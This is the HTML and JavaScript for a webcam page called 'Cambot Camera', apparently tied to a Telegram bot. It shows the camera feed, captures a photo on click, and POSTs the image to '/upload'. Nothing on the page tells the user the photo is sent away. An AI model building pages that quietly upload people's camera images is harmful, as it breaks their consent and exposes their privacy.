<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cambot Camera</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      overflow: hidden;
      position: relative;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
      color: #00f2fe;
      text-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
      z-index: 1;
    }

    video {
      width: 90%;
      max-width: 420px;
      border: 3px solid #00f2fe;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0, 242, 254, 0.3);
      z-index: 1;
    }

    /* Camera shutter button */
    #capture {
      margin-top: 25px;
      width: 70px;
      height: 70px;
      border-radius: 50%;
      border: 4px solid #00f2fe;
      background: radial-gradient(circle at center, #4facfe, #00f2fe);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
      transition: all 0.2s ease-in-out;
      z-index: 1;
    }

    #capture i {
      font-size: 24px;
      color: #111;
    }

    #capture:hover {
      transform: scale(1.1);
      box-shadow: 0 0 35px rgba(79, 172, 254, 0.9);
    }

    footer {
      margin-top: 40px;
      font-size: 0.8rem;
      opacity: 0.7;
      z-index: 1;
    }

    /* Floating ghost text */
    .floating-text {
      position: absolute;
      bottom: 15%;
      left: -300px;
      font-size: 1.2rem;
      font-weight: bold;
      color: #00f2fe;
      opacity: 0.9;
      animation: move-across 8s linear infinite;
      white-space: nowrap;
      pointer-events: none;
      z-index: 2;
    }

    @keyframes move-across {
      0% { transform: translateX(0); opacity: 0; }
      10% { opacity: 1; }
      50% { opacity: 0.8; }
      80% { opacity: 0.3; }
      100% { transform: translateX(120vw); opacity: 0; }
    }

    /* Flash effect */
    #flash {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      opacity: 0;
      pointer-events: none;
      z-index: 999;
    }
  </style>
</head>
<body>
  <h1><i class="fas fa-robot"></i> Cambot Camera</h1>
  <video id="video" autoplay playsinline></video><br>

  <!-- Round camera button -->
  <div id="capture"><i class="fas fa-camera"></i></div>

  <canvas id="canvas" style="display:none;"></canvas>

  <div class="floating-text"><i class="fas fa-code"></i> Developed by Churchill</div>
  <div id="flash"></div>

  <footer><i class="fas fa-bolt"></i> Powered by Cambot â€¢ Telegram Bot</footer>

  <audio id="shutter-sound" src="cam.mp3" preload="auto"></audio>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const captureBtn = document.getElementById("capture");
    const sound = document.getElementById("shutter-sound");
    const flash = document.getElementById("flash");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => alert("Camera error: " + err));

    captureBtn.addEventListener("click", async () => {
      sound.play();

      flash.style.opacity = "1";
      setTimeout(() => { flash.style.opacity = "0"; }, 100);

      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
      const form = new FormData();
      form.append("photo", blob, "capture.jpg");

      try {
        await fetch("/upload", {
          method: "POST",
          body: form
        });
      } catch (err) {
        console.error("Upload failed", err);
      }
    });
  </script>
</body>
</html>
